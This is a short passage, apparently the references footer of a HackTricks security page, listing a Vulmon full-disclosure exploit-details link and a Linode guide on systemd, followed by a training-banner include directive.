- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
